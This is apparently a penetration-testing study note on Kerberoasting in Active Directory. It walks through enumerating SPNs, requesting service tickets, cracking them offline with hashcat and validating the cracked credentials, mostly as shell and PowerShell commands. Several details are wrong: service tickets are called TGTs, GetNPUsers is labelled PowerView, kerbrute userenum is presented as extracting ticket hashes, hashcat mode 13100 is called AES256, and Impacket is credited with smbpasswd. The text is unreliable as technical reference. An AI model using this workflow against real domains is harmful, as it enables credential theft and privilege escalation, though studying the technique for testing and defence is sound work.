# 🛰️ Kerberoasting

> [!ABSTRACT] Overview of Kerberoasting
>
>Kerberoasting is a method used in cybersecurity to exploit the Kerberos authentication protocol by requesting service tickets (TGTs) for specific services and then cracking those TGTs offline to obtain plaintext passwords. This technique can be highly effective when domain users have service account permissions.

## 🔍 Initial Setup

### Prerequisites
- **Kerberos Ticket**: A valid user ticket granting ticket (TGT).
- **Domain Information**: Knowledge of the target domain and its structure.
- **Cracking Tools**: Hashcat, John the Ripper, or other offline password crackers.

> [!NOTE] 
>Making sure you have a valid TGT is crucial. Obtain one using `kerbrute` or similar tools by leveraging known credentials.

## 🎯 Quick Kerberoasting Workflow

1. **List Service Principal Names (SPNs)**
   - Use `[[CrackMapExec]]` to enumerate SPNs.
   
2. **Request TGS for each SPN**
   - Request the service ticket granting tickets (TGS) using tools like [[GetNPUsers]] or [[kerbrute]].

3. **Harvest and Save Service Tickets (Hashes)**
   - Extract and save the service account hashes to a file.
   
4. **Offline Cracking of Hashes** 
   - Crack the extracted TGS offline using tools like `[[hashcat]]`.

5. **Credential Validation**
   - Validate cracked credentials on the domain.

---

## SPN Enumeration

### Using CrackMapExec
```bash
crackmapexec smb <IP> --spns > spn_list.txt
```

### Using GetNPUsers (PowerView)
```powershell
Get-DomainUser | Where-Object { $_.ServicePrincipalNames } | Select-Object Name, ServicePrincipalNames | Export-Csv -Path .\SPN_Enumeration.csv -NoTypeInformation
```

---

## Requesting and Extracting TGS

### CrackMapExec Command for TGS Extraction
```bash
crackmapexec smb <IP> --user <username> --pass <password> --spns --dc-ip <DC_IP>
```

### Example of Kerbrute Usage (Linux)
```bash
./kerbrute userenum --principal %s/$ --dc <DC_IP> usernames.txt > tgs_hashes.txt
```

---

## Offline Hash Cracking

### Using Hashcat for TGS Hashes
```bash
hashcat -m 13100 hashfile hashes.txt /path/to/wordlist.txt
```
- **Hash Type**: `13100` represents the Kerberos AES256-HMAC-SHA1 format.

---

## Credential Validation

### Testing Cracked Credentials with CrackMapExec
```bash
crackmapexec smb <IP> -u crackeduser.txt -p crackedpass.txt --shares
```

### Using Impacket's `smbpasswd` Tool to Verify
```bash
smbpasswd -U <username>@<DC_IP>
```
- Enter the password obtained from cracking.

---

## Common Findings

| Finding | Impact |
|---|---|
| Weak Service Account Passwords | Easy compromise and privilege escalation. |
| Excessive SPNs with High Permissions | Critical vulnerability for domain compromise. |
| Absence of Kerberos Ticket Validation on Services | Allows unauthorized access through TGS abuse. |

---

## 🧠 Exam Mental Model

```text
Enumerate SPNs
├─ Request TGS
│   ├─ Save Hashes
│   └─ Crack Offline
└─ Validate Credentials
```

> [!SUCCESS] Kerberoasting Rule of Thumb
>
> **Whenever you find a service with an exposed SPN**, immediately think:
> ```text
> Enumerate → Harvest → Crack → Validate
> ```
>This workflow can lead to significant privilege escalation in Active Directory environments.